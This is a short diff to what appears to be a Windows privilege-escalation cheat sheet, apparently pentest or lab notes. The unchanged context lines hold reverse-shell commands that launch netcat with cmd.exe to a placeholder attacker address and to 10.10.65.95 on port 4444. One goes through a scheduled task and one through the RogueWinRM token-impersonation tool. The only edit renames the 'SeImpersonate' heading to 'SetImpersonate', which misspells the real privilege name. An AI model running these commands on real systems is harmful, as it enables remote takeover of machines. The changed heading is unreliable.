@@ -18,7 +18,7 @@ echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\<taskfile>
 schtasks /run /tn <taskname>
 ```
 # privilege
-## SeImpersonate / SeAssignPrimaryToken
+## SetImpersonate / SeAssignPrimaryToken
 ```
 c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.10.65.95 4444"
 ```
